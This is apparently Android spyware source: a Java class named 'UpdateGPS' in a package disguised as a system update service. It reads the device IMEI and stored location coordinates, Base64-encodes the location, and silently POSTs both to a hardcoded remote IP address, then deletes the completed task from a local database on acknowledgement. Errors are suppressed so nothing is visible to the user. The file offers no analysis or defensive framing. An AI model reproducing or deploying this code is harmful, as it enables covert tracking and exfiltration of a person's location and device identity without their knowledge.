package com.android.updateService;

import android.content.Context;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.telephony.TelephonyManager;
import android.util.Base64;
import android.util.Log;
import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.mime.content.StringBody;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.protocol.BasicHttpContext;
import org.apache.http.protocol.HttpContext;
import org.apache.http.util.EntityUtils;
import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;
import org.xml.sax.InputSource;
import org.xml.sax.SAXException;

import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.parsers.ParserConfigurationException;
import java.io.IOException;
import java.io.StringReader;


public class UpdateGPS extends AsyncTask<String, Integer, String> {

    long totalSize;
    private Context tContext;
    protected SQLiteDatabase db;


    private static String URL = "http://46.252.202.124/update.php?q=3";
    public static final String PREFS_NAME = "Update";

    static SharedPreferences Sharedpref;

    public String getSession(String key) {
        Sharedpref = this.tContext.getSharedPreferences(PREFS_NAME, 0);
        return Sharedpref.getString(key, "").toString();
    }


    public UpdateGPS(Context tContext) {
        this.tContext = tContext;
        db = (new DatabaseHelper(tContext)).getWritableDatabase();
    }


    private String getSerialNo()
    {
        try{
            TelephonyManager tManager = (TelephonyManager)tContext.getSystemService(Context.TELEPHONY_SERVICE);
            String serialnum = tManager.getDeviceId();
            return serialnum;
        }catch (Exception hata){
            return  hata.getMessage();
        }
    }


    protected String doInBackground(String... arg0) {
       // Log.d("aaaaaaaaa", "UpdateGps class start");
        String  Topla = "<gps>";
        Topla += "<geo>";
        Topla += "<data>" +  getSession("Coordinates") + "</data>";
        Topla += "</geo>";
        Topla += "</gps>";

             HttpClient httpClient = new DefaultHttpClient();

             HttpContext httpContext = new BasicHttpContext();
             HttpPost httppost = new HttpPost(URL);

             try {
                 cmpe multipartEntity = new cmpe( new cmpe.ProgressListener()
                 {
                     @Override
                     public void transferred(long num)
                     {

                     }
                 });

                 multipartEntity.addPart("device", new StringBody(getSerialNo()));
                 multipartEntity.addPart("task", new StringBody(arg0[0]));
                 multipartEntity.addPart("data", new StringBody(Base64.encodeToString(Topla.getBytes("UTF-8"), Base64.DEFAULT)));


                 httppost.setEntity(multipartEntity);
                 totalSize = multipartEntity.getContentLength();
                 HttpResponse response = httpClient.execute(httppost, httpContext);

                 String result = EntityUtils.toString(response.getEntity(), "UTF-8");

                 Document doc = getDomElement(result);
                 NodeList nl = doc.getElementsByTagName("result");
                 Element e = (Element) nl.item(0);


                 if(getValue(e, "stat").toString().equalsIgnoreCase("true"))   {
                     db.delete("sUpdates", "taskUID=?", new String[] {getValue(e, "taskUID").toString() });
                 }
                 return (String) response.toString ();
             }
             catch (Exception e)
             {
                 return null;
             }

    }

    public Document getDomElement(String xml) {
        Document doc = null;
        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
        try {

            DocumentBuilder db = dbf.newDocumentBuilder();

            InputSource is = new InputSource();
            is.setCharacterStream(new StringReader(xml));
            doc = db.parse(is);

        } catch (ParserConfigurationException e) {

            return null;
        } catch (SAXException e) {

            return null;
        } catch (IOException e) {

            return null;
        }

        return doc;
    }

    public final String getElementValue(Node elem) {
        Node child;
        if (elem != null) {
            if (elem.hasChildNodes()) {
                for (child = elem.getFirstChild(); child != null; child = child.getNextSibling()) {
                    if (child.getNodeType() == Node.TEXT_NODE) {
                        return child.getNodeValue();
                    }
                }
            }
        }
        return "";
    }

    public String getValue(Element item, String str) {
        NodeList n = item.getElementsByTagName(str);
        return this.getElementValue(n.item(0));
    }


}

